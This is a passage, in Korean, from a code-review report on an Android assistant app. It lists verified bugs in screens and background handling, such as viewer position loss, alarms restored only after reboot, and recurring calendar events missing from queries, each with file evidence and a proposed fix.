- 왜: 보관함 문서로 질문을 이어 가면 같은 법령·교재의 다른 조문이 출처로 나온다. 뷰어 창이 최근 앱에 남아 있는 상태(채팅으로 보내기를 쓴 뒤, 또는 뒤로가 아니라 홈·최근 앱으로 돌아온 경우)에서 다른 출처 카드를 누르면 뷰어가 예전에 보던 자리 그대로 올라온다. '누르면 그 위치로 연다'(0.41.2)는 기능이 조용히 어긋나 사용자는 출처가 틀렸다고 느낀다. 플랫폼 동작(기존 창이 onNewIntent 를 받음)은 문서 기준 추정이고 직접 재현하지는 않았다.
- 제안: DocumentViewerActivity 에 onNewIntent 를 재정의해 setIntent 하고, 열 위치를 mutableState(또는 뷰모델의 StateFlow)로 올려 새 값이 오면 PdfView·FlowView 가 그 쪽·블록으로 스크롤하게 한다(같은 위치를 다시 눌러도 움직이도록 요청마다 번호를 붙인다). URI 가 다르면 viewModel.load 를 다시 부른다. 에뮬레이터 확인: 문서를 연 채 홈 → 채팅에서 같은 문서의 다른 조문 출처 카드 → 그 조문으로 이동.
- 근거:
  - app/src/main/AndroidManifest.xml:70-77 — 뷰어는 documentLaunchMode="intoExisting" 이라 같은 URI 로 다시 열면 기존 창이 새 인텐트를 받는다
  - app/src/main/java/com/kosmos/app/feature/document/DocumentViewerActivity.kt:50-62 — 열 위치(쪽·머리말)는 onCreate 에서 한 번만 읽는다. onNewIntent 재정의가 없다(저장소 전체에서 MainActivity 에만 있음)
  - app/src/main/java/com/kosmos/app/feature/document/DocumentViewerScreen.kt:78-79, 135, 144 — target 은 '처음 그릴 때 한 번만' 쓰인다
  - app/src/main/java/com/kosmos/app/feature/document/DocumentViewerActivity.kt:98-100 — '채팅으로 보내기'는 뷰어를 닫지 않고 채팅을 앞으로 가져온다(뷰어 창이 남는 것이 설계)
  - app/src/main/java/com/kosmos/app/feature/chat/result/DocSourceViewModel.kt:45 — 출처 카드는 매번 쪽·머리말을 실어 연다
- 검증: 직접 읽음: AndroidManifest.xml:69-75(documentLaunchMode=intoExisting, taskAffinity 비움, autoRemoveFromRecents=true) / DocumentViewerActivity.kt:50-62(target 을 onCreate 에서 한 번만 읽음) · onNewIntent 재정의 없음(grep 결과 MainActivity.kt:91 뿐) · 98-100(채팅으로 보내기는 뷰어를 닫지 않음) · 110-117(출처 카드 인텐트는 쪽·머리말을 extra 로만 실음 — 기존 창 찾기는 extra 를 보지 않는다) / DocumentViewerScreen.kt:135·144(initialPage·initialBlock 은 처음 한 번) / DocSourceViewModel.kt:45. 범위 한정: 뷰어를 뒤로가기(finish)로 닫으면 autoRemoveFromRecents 로 창이 없어져 새로 만들어지므로 정상. 어긋나는 것은 뷰어 창이 남아 있는 경우(채팅으로 보내기 사용 뒤, 홈·최근 앱으로 나온 뒤)뿐이다. 기존 창이 새 인텐트를 onNewIntent 로 받는다는 것은 플랫폼 문서 기준이고 기기에서 재현하지는 않았다 — 고치기 전에 에뮬레이터에서 한 번 확인할 것
- 앞선 기록: CHANGELOG 0.34.0·AndroidManifest 주석(63-67행) — intoExisting 을 고른 이유만. 같은 창을 다시 열 때의 위치 처리는 기록 없음

### screens-6 · 백업 내보내기가 끝나도 아무 안내가 없고, 저장 위치를 고르는 사이 화면이 다시 만들어지면 빈 파일이 남을 수 있다
- 판정 일부만 맞음 · 중요도 중간 · 크기 S
- 왜: 디버그 빌드로 실사용하는 동안 백업은 데이터를 지키는 유일한 수단인데, 저장이 됐는지 사용자가 알 길이 없다. 또 저장 위치 고르기(시스템 화면)가 떠 있는 동안 회전하면 고르기 화면이 두 번 뜨고, 프로세스가 죽었다 살아나면 뷰모델 상태가 사라져 saveExportTo 가 그냥 돌아간다 — 이때 시스템은 이미 고른 위치에 0바이트 zip 을 만들어 둔 상태라 '백업 파일이 있다'고 믿게 된다. 드문 경로지만 결과가 '백업이 있는 줄 알았는데 비어 있음'이라 무겁다.
- 제안: (1) BackupState 에 Saved 를 추가해 저장 성공 시 스낵바 '백업을 저장했어요'를 보인다(한·영 문자열 추가). (2) 고르기 화면을 띄웠는지를 뷰모델 상태에 표시해 다시 구성돼도 한 번만 띄운다. (3) saveExportTo 가 ReadyToSave 가 아닌 상태로 불리면 DocumentsContract.deleteDocument 로 방금 만들어진 빈 문서를 지우고 실패 안내를 띄운다. 단위 테스트: 성공 → Saved, 상태 없음 → Failed.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/memory/MemoryViewModel.kt:304-314 — 복사 성공이면 상태를 Idle 로만 되돌린다(완료 상태·문구 없음). 상태가 ReadyToSave 가 아니면 말없이 돌아간다
  - app/src/main/java/com/kosmos/app/feature/memory/MemoryScreen.kt:108-121 — 상태가 ReadyToSave 면 LaunchedEffect 가 저장 위치 고르기를 띄운다. 화면이 다시 구성되면 같은 상태로 한 번 더 띄운다
  - app/src/main/AndroidManifest.xml:47-49 — MainActivity 는 configChanges 가 uiMode 뿐이라 회전·글자 크기 변경에 다시 만들어진다
  - app/src/main/res/values/strings.xml:283-294 — 내보내기 완료를 알리는 문자열이 없다(복원 완료·실패만 있음)
- 검증: 직접 읽음: MemoryViewModel.kt:304-314(복사 성공 → Idle 뿐, ReadyToSave 가 아니면 말없이 return) / MemoryUiState.kt:21-44(Saved 같은 완료 상태 없음) / MemoryScreen.kt:108-121 / strings.xml:283-294(내보내기 완료 문구 없음) / AndroidManifest.xml:44-50(configChanges=uiMode 뿐, 화면 방향 고정도 없음). 맞는 것: 내보내기 완료 안내가 전혀 없다(확정 — 이 부분만으로 고칠 값이 있다). 고칠 세부: '다시 구성되면 한 번 더 띄운다'는 부정확 — LaunchedEffect(backupState) 는 같은 값의 재구성에서는 다시 돌지 않고, 액티비티가 다시 만들어질 때만(회전·글자 크기 변경) 새 구성에서 한 번 더 뜬다. 그때 첫 결과로 복사가 진행 중인데 두 번째 고르기를 취소하면 onExportCancelled 가 파일을 지우는 경합도 생긴다. 0바이트 파일은 고르기 화면이 떠 있는 동안 프로세스가 죽은 경우에만 성립(뷰모델 상태 소실)하며 모델을 이미 해제한 뒤라 드물다 — 코드상 가능하지만 확인하지 못한 추정

### screens-7 · 일정 화면 '오늘' 탭: 할 일 완료에 되돌리기·실패 안내가 없고, 화면으로 돌아와도 다시 읽지 않는다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 같은 '할 일 완료'가 화면에 따라 다르게 동작한다 — 오늘 탭에서는 스치듯 눌러도 조용히 사라지고, 되살리려면 메모·할 일 화면의 완료 묶음까지 가야 한다. 또 일정 화면을 띄운 채 앱을 내렸다가 다음 날 돌아오면 날짜 머리는 오늘인데 알림(이미 울린 것)과 할 일(위젯·알림에서 끝낸 것)은 어제 읽은 그대로다. 매일 여는 화면이라 실사용에서 체감된다.
- 제안: (1) CalendarViewModel 에 actionError 와 restoreTask 를 두고 CalendarScreen 에 스낵바를 붙여 메모·할 일 화면과 같은 '완료했어요 · 되돌리기'를 준다(문자열 memory_task_completed_snackbar 재사용). (2) 조회를 LifecycleResumeEffect(또는 rememberToday 가 쓰는 복귀 신호)에 묶어 화면 복귀마다 loadSchedule 을 부른다 — 이미 Success 면 Loading 으로 깜빡이지 않게 기존 값을 유지한 채 갱신. (3) 오류 줄에 [다시 시도] 버튼.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/calendar/CalendarViewModel.kt:105-112 — completeTask 는 성공일 때만 갱신하고 실패는 버린다. 되돌리는 함수가 없다
  - app/src/main/java/com/kosmos/app/feature/calendar/CalendarScreen.kt:182, 284-287 — 체크 원 한 번 누르면 바로 완료
  - app/src/main/java/com/kosmos/app/feature/memory/MemoryScreen.kt:173-186 — 같은 동작이 메모·할 일 화면에서는 '실수할 수 있어 되돌리기를 둔다'(0.36.2 사용자 결정)
  - app/src/main/java/com/kosmos/app/feature/memory/MemoryUiState.kt:58-64 — '저장 실패가 무시되면 탭이 씹혔다고 본다'는 이유로 실패 안내를 넣은 기록
  - app/src/main/java/com/kosmos/app/feature/calendar/CalendarScreen.kt:60-62 — 조회는 LaunchedEffect(Unit) 한 번뿐. 화면 복귀 때 today 는 갱신되지만(45행) 일정·알림·할 일은 다시 읽지 않는다
  - app/src/main/java/com/kosmos/app/feature/calendar/CalendarScreen.kt:163-165 — 조회 실패 시 글자만 있고 다시 시도 버튼이 없다
- 검증: 직접 읽음: CalendarViewModel.kt:105-112(성공일 때만 갱신, 실패 무시, 복원 함수 없음) / CalendarScreen.kt:182·284-287(체크 원 한 번에 완료) · 60-62(LaunchedEffect(Unit) 한 번만 조회, 47행 today 만 복귀 때 갱신) · 163-165(오류는 글자만, 다시 시도 없음) / MemoryScreen.kt:173-186(같은 동작에 되돌리기 스낵바). 일정 화면 파일들에 Snackbar·actionError 가 없음을 grep 으로 확인. 세 가지 모두 코드 그대로다. 데이터 손실은 아니고(완료한 것은 메모·할 일 화면에서 되살릴 수 있음) 일관성·낡은 표시 문제
- 앞선 기록: docs/plans/0.38.3-screen-structure.md 51·54행 — 오늘 탭에 완료 체크를 넣는다는 것만. 되돌리기를 빼기로 한 기록은 없음. MemoryScreen.kt:173 주석의 0.36.2 사용자 결정(완료는 사후 되돌리기)은 메모·할 일 화면에만 적용돼 있음

### screens-8 · 데이터 초기화가 알림 예약을 먼저 취소하고 나서 지운다 — 지우기가 실패하면 할 일은 남고 알림만 사라진다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: DB 트랜잭션이 실패하면(저장 공간 부족·잠금 등) 화면에는 '지우지 못했어요'만 나오고 할 일·알림 시각은 목록에 그대로 보이는데, 예약된 알람은 이미 취소돼 재부팅 전까지 울리지 않는다. 드문 경우지만 '알림이 조용히 안 온다'는 가장 나쁜 종류의 실패다. 문서 보관함 초기화도 같은 뷰모델을 타는데, 색인 중인 작업을 멈추거나 문서 읽기 권한을 돌려주는 정리가 없다(같은 파일 67-87행에 LIBRARY 처리 없음).
- 제안: 알림 id 목록을 먼저 읽어 변수에 담아 두고, reset 이 성공한 뒤에 그 목록으로 cancel 한다(지우기 전에 읽었으므로 KDoc 의 걱정은 그대로 해결된다). LIBRARY 가 대상이면 성공 뒤 색인·벡터 작업을 취소하고, 최근 문서에 없는 URI 의 읽기 권한을 돌려준다. 기존 DataResetViewModelTest 에 '실패 시 cancel 0회' 한 건 추가.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/settings/DataResetViewModel.kt:71-74 — 초기화 전에 살아 있는 알림 전부를 reminderAlarmScheduler.cancel
  - app/src/main/java/com/kosmos/app/feature/settings/DataResetViewModel.kt:75-85 — 그 뒤 reset 이 Failure 면 실패 문구만 띄우고 알람은 되살리지 않는다
  - app/src/main/java/com/kosmos/app/feature/settings/DataResetViewModel.kt:42-44 — '지운 뒤에는 어떤 알람이 있었는지 알 수 없다'는 이유로 순서를 이렇게 잡았다
- 검증: 직접 읽음: DataResetViewModel.kt:71-74(reset 전에 살아 있는 알림 전부 cancel) · 75-85(Failure 면 문구만, 재예약 없음) / DataResetRepositoryImpl.kt:25-30(한 트랜잭션의 DELETE). 알람을 되살리는 곳은 재부팅 수신기(ReminderBootReceiver)뿐임을 grep 으로 확인. 제안(먼저 id 를 읽어 두고 성공 뒤 취소)은 KDoc 의 걱정을 그대로 해결한다. 단순 DELETE 트랜잭션이 실패할 일은 드물어 low 유지. 덧붙인 주장(문서 보관함 초기화 때 색인 작업 중단·읽기 권한 반납이 없음)도 맞다 — 같은 파일에 LIBRARY 처리 줄이 없고, 권한 반납은 DocumentAccess.kt:55 에만 있다. 다만 이것은 별개의 작은 정리 거리
- 앞선 기록: CHANGELOG 0.37.1 대(초기화 도입) — 취소를 먼저 하는 순서의 이유는 DataResetViewModel KDoc(42-44행)에만 있음

### screens-9 · 대화 요약 수정: 저장 결과를 기다리지 않고 편집 칸을 닫아 실패하면 고친 내용이 사라진다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 요약 본문을 길게 고친 뒤 저장이 실패하면 편집 칸이 이미 닫혀 입력이 사라지고 오류 문구만 남는다. 프로필 시트·할 일 추가에서 이미 세운 원칙(성공 뒤에만 닫기)과 어긋나는 한 곳이다. 또 드로어의 시트 뷰모델은 액티비티 범위라 오류 문구가 다음에 여는 다른 대화 시트에까지 따라온다.
- 제안: EpisodeSheet 의 onSave 에서 editing = false 를 viewModel.save 의 onSaved 콜백 안으로 옮긴다(삭제가 이미 그렇게 한다, 164-167행). EpisodeSheetViewModel.load 첫 줄에서 _actionError 를 null 로 되돌린다. 단위 테스트 두 건.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/episode/EpisodeSheet.kt:101-105 — save 를 부른 직후 editing = false (성공 콜백은 onChanged 뿐)
  - app/src/main/java/com/kosmos/app/feature/episode/EpisodeSheetViewModel.kt:71-88 — 실패는 actionError 로만 알린다
  - app/src/main/java/com/kosmos/app/feature/episode/EpisodeSheetViewModel.kt:61-69 — load 가 actionError 를 지우지 않아, 같은 뷰모델을 쓰는 다음 시트에 앞 시트의 오류 문구가 남는다
  - app/src/main/java/com/kosmos/app/feature/profile/ProfileSheetViewModel.kt:62-64 — 같은 앱의 프로필 시트는 '저장이 끝난 뒤에만 입력란을 비운다'를 원칙으로 적어 두었다
- 검증: 직접 읽음: EpisodeSheet.kt:101-105(save 호출 직후 editing=false, 성공 콜백은 onChanged 뿐) · 162-166(삭제는 성공 뒤에만 닫음 — 같은 파일 안에서 원칙이 갈림) / EpisodeSheetViewModel.kt:61-69(load 가 _actionError 를 지우지 않음) · 71-88(실패는 actionError 로만). dismissActionError 는 저장 버튼에서만 불리므로 삭제 실패 문구는 다음 시트에도 남는다(드로어의 시트 뷰모델은 액티비티 범위). 저장 실패 자체가 드물어 low

### screens-10 · 모델 내려받기 화면: '다시 시도'가 기억하는 주소와 직접 입력한 주소가 화면 재생성에 사라진다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 직접 입력한 주소로 받다가 실패하면, 사용자가 다른 화면에 다녀왔거나 회전·프로세스 재시작이 있었던 경우 [다시 시도]가 말없이 기본 모델 주소(약 3.6GB)를 받기 시작한다. 이어받기용 부분 파일과도 주소가 달라진다. 자주 쓰는 경로는 아니지만 누르면 큰 데이터가 움직이는 버튼이라 잘못된 대상을 받는 것은 피해야 한다.
- 제안: 두 값을 rememberSaveable 로 바꾸는 것만으로는 화면을 떠났다 온 경우를 못 막으므로, 마지막 요청 주소를 다운로드 상태 쪽(DownloadModelUseCase 의 상태 또는 작업 입력 데이터)에서 읽어 [다시 시도]에 쓴다. 최소 수정은 rememberSaveable + 실패 대화상자에 받을 대상(기본 모델/직접 주소)을 한 줄로 보여 주는 것.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/settings/ModelManagementScreen.kt:38-42 — customUrl 과 lastRequestedUrl 이 remember 라 화면이 다시 만들어지면 기본값으로 돌아간다
  - app/src/main/java/com/kosmos/app/feature/settings/ModelManagementScreen.kt:189-192 — 실패 대화상자의 [다시 시도]는 lastRequestedUrl 로 다시 받는다
  - app/src/main/java/com/kosmos/app/feature/settings/ModelManagementViewModel.kt:70-72 — 다운로드는 WorkManager 로 화면과 무관하게 이어지므로, 실패 안내는 화면을 떠났다 돌아온 뒤에 보는 일이 흔하다
- 검증: 직접 읽음: ModelManagementScreen.kt:38·42(customUrl·lastRequestedUrl 이 remember, 기본값은 기본 모델 주소) · 51(startDownload 에서만 갱신) · 189-192([다시 시도]가 lastRequestedUrl 사용) / ModelManagementViewModel.kt:58-60·77(상태는 WorkManager 쪽에서 관찰만, 화면과 무관하게 이어짐). 화면을 떠났다 오거나 다시 만들어지면 직접 주소 실패의 [다시 시도]가 기본 모델을 받기 시작한다는 경로는 성립. 직접 주소 입력은 개발용에 가까운 드문 경로라 low. '부분 파일과 주소가 달라진다'는 부분은 다운로드 작업 코드를 열어 확인하지 않았다
- 앞선 기록: CHANGELOG 360행(0.41.9~10 대, 다운로드 재시도 한도·취소) — 재시도 주소 보존은 기록 없음

<details><summary>읽은 범위</summary>

[직접 읽은 것] 범위의 뷰모델 전부(Settings·DataReset·ModelManagement·Audit·EmbeddingModel·DocumentHome·DocumentViewer·Calendar·Memory·ProfileSheet·ProfileSuggestionResolver·Drawer·EpisodeSheet·MemoryCleanup·Splash)와 상태 클래스, navigation/AppNavHost·AppDestination, ui/AppRestart·ModelDisplayName, 화면 중 SettingsScreen 전체, SettingsSections 의 모델 상태·초기화 구역(150-306행), ModelManagementScreen(30-336행), EmbeddingModelSection, DocumentHomeScreen(55-337행), DocumentViewerActivity·ViewerTarget 전체, DocumentViewerScreen(60-200행), CalendarScreen 전체, TodaySchedule, MonthCalendar(40-200·270-356행), MemoryScreen 전체, MemoryComponents(50-282행), AppDrawerContent, EpisodeSheet, MemoryCleanupScreen(50-150행), SplashScreen(40-153행). 근거 확인을 위해 범위 밖의 MainScreen, KosmosApp(95-125행), GemmaModelRunner 의 close·warmUp, GemmaRuntimeManager.checkModelFile, DataResetRepositoryImpl, AddScheduleUseCase, GetTodayScheduleUseCase 병합부, DefaultPagingSource, DocSourceViewModel, AndroidManifest 의 두 액티비티 항목, strings.xml 한·영의 해당 화면 문구(빈 화면 안내·각주·초기화 설명)를 읽었다.

[읽지 못했거나 훑기만 한 것] ProfileSheet.kt 화면, AuditScreen.kt 화면과 AuditLabels 앞 250행, SettingsSections 1-150행, PdfView·SheetView·FlowView·CellPaint 의 그리기 코드, 스플래시 장면 그리기(GalaxyScene·PlanetScene·SplashDraw·SplashHandoff·SplashStage), ui/calendar/MonthGrid, MemoryCleanupScreen 150행 이후(검토 목록)는 grep 수준으로만 봤다(직접 fontSize·하드코딩 색·한글 문자열 검색). 긴 목록 성능·접근성·인셋은 이 범위에서 새 문제를 찾지 못했다(목록은 Paging/LazyColumn, 누르는 영역 48dp, 화면마다 TopAppBar·navigationBarsPadding 처리 확인). gradle·adb·테스트는 규칙대로 실행하지 않았으므로 모든 항목은 코드 읽기 근거다. screens-5 의 '기존 창이 새 인텐트를 받는다'는 플랫폼 문서 기준 추정이다.

[빈 화면 안내 대조 결과] calendar_today_all_clear("내일 3시에 회의 잡아줘")·memory_empty_notes("기억해 줘")·memory_empty_tasks(아래 칸 추가)·drawer_empty_episodes·doc_home_empty_recent·audit_empty·settings_voice_footnote 는 실제 기능(일정 추가·메모 저장 도구, 인라인 추가 줄 등)과 맞았다. 어긋난 것은 초기화 대화상자 문구 한 묶음(screens-4)뿐이다. 다만 drawer_empty_episodes 의 '자동 정리돼 여기 보여요'는 screens-2 때문에 실제로는 재시작 전까지 지켜지지 않는다.

[10건을 넘겨 뺀 것 6건] (1) 문서 홈의 '되돌리기' 대기 중 화면을 떠나거나 프로세스가 죽으면 보관함에서 뺀 문서가 다시 나타나거나 읽기 권한이 남을 수 있음 — 뷰모델 정리와 스낵바 취소의 순서에 달린 추정이라 확신이 낮아 뺌. (2) AuditLabels 의 도구 결과 문구 변환표가 실행기의 문구를 정규식으로 따로 베껴 두 곳을 맞춰야 하고 결과가 한국어로 고정 — 모델 입력을 못 바꾸는 제약에서 나온 의도된 구조이고 테스트(AuditLabelsTest)가 있어 뺌. (3) FlowView·SheetView 의 직접 fontSize 사용(DESIGN '글자 크기는 단계만') — 문서 본문 배율·표 셀이라는 뷰어 고유 사정으로 보여 취향 지적에 가까워 뺌. (4) MemoryScreen 의 initialFilter 가 화면 재생성 때마다 할 일 탭으로 되돌림, 월 탭이 재생성 때 선택한 날을 잃음 — 영향이 작아 뺌. (5) EmbeddingModelViewModel 이 combine 변환 안에서 refresh·acknowledge 부수효과를 냄, 실패 사유를 보여 주지 않음 — 동작 결함은 확인 못 해 뺌. (6) 설정의 정확 알람 설정 열기·일정 화면의 앱 설정 열기가 startActivity 를 예외 처리 없이 부름 — 표준 시스템 화면이라 가능성이 낮아 뺌.

[일부러 내지 않은 것] 릴리스 빌드·R8·서명, 백업 암호화(코드에 v1 의도라고 명시), 화면에서 민감 값 가리기, 임베딩 GPU, 기억→알림 트리거, 브랜치·PR 관련 제안은 이미 내려진 결정이라 다루지 않았다. 모델 입력(도구 선언·지시·결과 문구)을 바꾸는 제안은 없다 — 전 항목 touchesModelInput=false.

</details>

## 플랫폼·백그라운드 (platform)

### platform-1 · 예약된 알림 알람을 다시 거는 곳이 '재부팅' 하나뿐이다 — 강제 종료·백업 복원·권한 변경 뒤에는 알림이 울리지 않는다
- 판정 확인됨 · 중요도 높음 · 크기 S
- 왜: 안드로이드는 앱을 강제 종료하면(설정의 강제 종료, adb/안드로이드 스튜디오 실행 시의 force-stop) 그 앱의 AlarmManager 예약을 모두 지운다. 이 앱은 디버그 빌드를 계속 새로 설치하며 실사용하고, 기기 확인 절차에도 '강제 종료 → 켜기'가 들어 있어 이 상황이 자주 생긴다. 그 뒤 앱을 다시 켜도 알람을 다시 걸지 않으므로, DB 에는 '예약됨'으로 남아 있는 알림이 다음 재부팅 전까지 조용히 울리지 않는다. 백업을 새 휴대폰에 복원했을 때도 같은 이유로 복원된 알림 전부가 울리지 않는다. 또 정확한 알람 권한을 나중에 켜도 이미 걸린 느슨한 알람은 그대로다. '3시에 알려줘'가 핵심 기능이라 실사용 신뢰도에 직접 영향을 주고, 면접에서 '알람 복원을 어떻게 보장하나'라는 질문에 약점이 된다.
- 제안: ① KosmosApp.onCreate 에서 IO 코루틴으로 ReminderAlarmScheduler.restoreAll() 을 한 번 부른다(같은 PendingIntent 를 다시 거는 것이라 여러 번 불러도 안전하고, 지난 알림은 한 번 울린 뒤 기록되므로 중복되지 않는다). HiltTestApplication 에서는 onCreate 가 안 불려 테스트 격리는 유지된다. ② 백업 가져오기 성공 뒤 재시작 경로가 ①로 자동 해결되는지 테스트로 고정한다. 오래된 백업을 복원하면 지난 알림이 한꺼번에 울릴 수 있으니, 복원 직후에는 '지난 것은 울리지 않고 발화 처리만' 하는 방식(MemoryViewModel 154줄 근처의 기존 처리와 같은 결)을 쓸지 사용자에게 묻는다. ③ ReminderBootReceiver 의 인텐트 필터에 정확한 알람 권한 상태 변경 방송(AlarmManager.ACTION_SCHEDULE_EXACT_ALARM_PERMISSION_STATE_CHANGED)과 시간대 변경(ACTION_TIMEZONE_CHANGED)을 추가해 같은 restoreAll 을 태운다. 에뮬레이터에서 'adb shell am force-stop → 앱 켜기 → adb shell dumpsys alarm' 으로 확인할 수 있다.
- 근거:
  - app/src/main/java/com/kosmos/app/platform/alarm/ReminderBootReceiver.kt:30-34 — BOOT_COMPLETED 일 때만 restoreAll() 호출
  - app/src/main/java/com/kosmos/app/platform/alarm/ReminderAlarmScheduler.kt:65 — restoreAll 정의. 저장소 전체 grep 결과 호출자는 ReminderBootReceiver 하나뿐
  - app/src/main/java/com/kosmos/app/KosmosApp.kt:86-96 — onCreate 에서 브리핑·위젯은 챙기지만 알림 알람 복원은 없음
  - app/src/main/java/com/kosmos/app/feature/memory/MemoryViewModel.kt:322-336 — 백업 가져오기 성공 시 위젯 갱신 표시만 남기고 알람은 다시 걸지 않음
  - app/src/main/AndroidManifest.xml:142-148 — 리시버가 받는 방송은 BOOT_COMPLETED 뿐
  - docs/checklists/device_gate.md:371 — 기기 확인 절차 자체가 '강제 종료 → 켜기'를 쓴다
- 검증: 직접 확인: ReminderBootReceiver.kt:30 은 BOOT_COMPLETED 가 아니면 바로 return, 34줄에서만 restoreAll. 저장소 전체 grep 에서 restoreAll 호출자는 이 리시버와 테스트(ReminderAlarmSchedulerTest 90·102줄)뿐. KosmosApp.kt:86-96 onCreate 에 알람 복원 없음. MemoryViewModel.kt:322-339 가져오기 성공 시 widgetRefresher.refreshOnNextStart() 만 호출. AndroidManifest.xml:142-148 필터는 BOOT_COMPLETED 하나. schedule 호출자는 AddReminderToolExecutor·ReminderEditor·MemoryViewModel(되살리기)뿐이라 앱 시작 때 다시 거는 경로가 없다. 강제 종료가 AlarmManager 예약을 지운다는 것은 안드로이드 동작 지식(코드 근거 아님)이지만 잘 알려진 동작이다. 고칠 때 주의: (1) 알람이 프로세스를 깨운 경우 KosmosApp.onCreate 의 restoreAll 과 ReminderAlarmReceiver 가 같은 지난 알림을 동시에 fire 할 수 있다 — ReminderFireHandler.kt:47-52 의 '확인 → 알림 → 기록'이 원자적이지 않아 알림음이 두 번 날 수 있으니(알림 ID 는 같아 화면에는 하나) 뮤텍스나 조건부 UPDATE 가 필요하다. (2) 오래된 백업 복원 시 지난 알림이 한꺼번에 울리는 문제는 제안대로 사용자에게 물을 것. (3) 정확 알람 권한 변경 방송 추가는 타당, 시간대 변경은 RTC 절대 시각이라 필수는 아님.
- 앞선 기록: CHANGELOG 0.21.x 리마인더 회차(1038줄) — 'BOOT_COMPLETED 복원'만 대가로 적혀 있다. 강제 종료·백업 복원 뒤 알람 유실 기록은 CHANGELOG·architecture·plans 에서 찾지 못했다(강제 종료는 device_gate 371줄·0.42.4/0.42.8 계획서의 확인 절차로만 등장).

### platform-2 · 기기 캘린더의 반복 일정(매주 회의·생일 등)이 일정 조회·브리핑·위젯에서 통째로 빠진다
- 판정 확인됨 · 중요도 높음 · 크기 M
- 왜: 안드로이드 캘린더에서 반복 일정은 Events 표에 '첫 회차의 시작 시각 + 반복 규칙(RRULE) + 길이(DURATION)'로 한 줄만 저장되고 끝 시각(DTEND)은 비어 있다. 지금 조건식은 DTEND 가 비어 있으면 거짓이 되므로 반복 일정은 어느 날짜를 조회해도 나오지 않는다. 구글·삼성 캘린더를 쓰는 실사용자의 일정 상당수(주간 회의, 수업, 생일)가 '오늘 일정'·아침 브리핑·홈 위젯·모델의 일정 조회 답에서 조용히 빠진다는 뜻이다. 또 동기화 계정에서 지운 일정은 DELETED=1 로 한동안 남는데 이것을 거르지 않아, 지운 일정이 보일 수 있다. '오늘 일정 없어요'라고 틀리게 답하는 것은 비서 앱에서 가장 신뢰를 깎는 종류의 결함이다.
- 제안: readEvents 를 CalendarContract.Instances 조회로 바꾼다 — Instances.CONTENT_URI 에 시작·끝 밀리초를 붙여 질의하면 시스템이 반복 일정을 날짜별 회차로 펼쳐 주고 지운 일정도 제외한다. 열은 Instances.EVENT_ID, TITLE, BEGIN, END, ALL_DAY, EVENT_LOCATION, DESCRIPTION 을 쓰고, 종일 일정의 UTC 날짜 처리(76~82줄)는 BEGIN/END 에 그대로 적용한다. 같은 반복 일정의 여러 회차가 같은 EVENT_ID 를 가지므로 CalendarEvent.id 는 'EVENT_ID:BEGIN' 처럼 회차별로 구분되게 한다(id 를 키로 쓰는 화면 목록 확인). 에뮬레이터 캘린더에 매주 반복 일정을 하나 만들어 오늘/이번 주/월 조회로 확인한다. 조회 결과 건수가 늘면 일정 조회 툴 결과(모델 입력)의 길이가 늘 수 있으니 기존 건수 상한이 그대로 적용되는지 확인한다(문구 자체는 바꾸지 않는다).
- 근거:
  - app/src/main/java/com/kosmos/app/platform/calendar/AndroidCalendarTool.kt:52-61 — CalendarContract.Events 표를 'DTSTART < ? AND DTEND > ?' 로 직접 조회
  - app/src/main/java/com/kosmos/app/platform/calendar/AndroidCalendarTool.kt:39-47 — 조회 열에 RRULE·DURATION·DELETED 가 없음
  - 저장소 전체 grep: CalendarContract.Instances·RRULE 사용처 0건
- 검증: 직접 확인: AndroidCalendarTool.kt:39-47 조회 열에 RRULE·DURATION·DELETED 없음, 52줄 selection 'DTSTART < ? AND DTEND > ?', 55-56줄 CalendarContract.Events.CONTENT_URI 직접 조회. 저장소 grep 에서 CalendarContract.Instances·RRULE 0건. 반복 일정이 Events 표에 DTEND 없이(RRULE+DURATION) 저장된다는 것은 안드로이드 캘린더 계약 지식이며, 그 경우 SQL 의 NULL 비교가 거짓이라 행이 빠진다 — 재현 경로가 코드로 설명된다. 또 반복 일정은 DTSTART 가 첫 회차라 DTEND 를 계산해 넣어도 뒤 회차는 못 잡는다. 따라서 Instances 조회가 맞는 처방. DELETED 열 미확인 부분은 계정 종류에 따라 다르므로(로컬 계정은 바로 삭제) 부차적이다. 고칠 때: CalendarEvent.id 를 회차별로 바꾸면 id 를 일정 수정·삭제에 쓰는 곳(쓰기 툴)이 원본 EVENT_ID 를 필요로 하는지 확인해야 한다. 조회 건수가 늘면 툴 결과 길이(모델 입력)가 늘 수 있으니 건수 상한 확인 필요 — 문구는 안 바뀐다.
- 앞선 기록: 반복 일정 관련 기록 없음(CHANGELOG·architecture·plans grep 에서 '반복 일정'은 0.24.0 계획서의 기억 추출 문구뿐). 겹침 판정(2026-08-15)·종일 일정(0.33.0)은 AndroidCalendarTool.kt:48-51, 76-77 주석에 있다.

### platform-3 · 정확한 알람 권한이 없을 때의 대체 알람이 절전(Doze) 중에는 울리지 않는다 — '최대 10분 늦음'이라는 안내와 다르다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: setWindow 로 건 알람은 기기가 절전(Doze) 상태에 들어가면 다음 유지보수 창까지 미뤄진다. 휴대폰을 책상에 두고 한두 시간 지난 뒤나 밤사이에는 10분이 아니라 수십 분~몇 시간 늦을 수 있다. 안드로이드 14 이상에서는 정확한 알람 권한이 기본으로 꺼져 있어, 사용자가 '설정에서 켜기'를 누르지 않으면 모든 알림이 이 경로를 탄다. 코드 주석과 화면 안내는 '최대 10분'이라고 말하므로 설명과 실제 동작이 어긋난다.
- 제안: 대체 경로를 setWindow 대신 alarmManager.setAndAllowWhileIdle(RTC_WAKEUP, triggerAtMs, pi) 로 바꾼다 — 권한이 필요 없고 절전 중에도 울린다(다만 시스템이 앱당 약 9분에 한 번으로 제한하고 정확하지는 않다). SecurityException 대비 runCatching 의 onFailure 쪽(52줄)도 같이 바꾼다. 주석·안내 문구('약 10분 안팎, 절전 중에는 조금 더 늦을 수 있음')를 실제 동작에 맞춘다. 에뮬레이터에서 'adb shell dumpsys deviceidle force-idle' 로 절전을 강제한 뒤 권한을 끈 상태의 알림이 울리는지 확인한다.
- 근거:
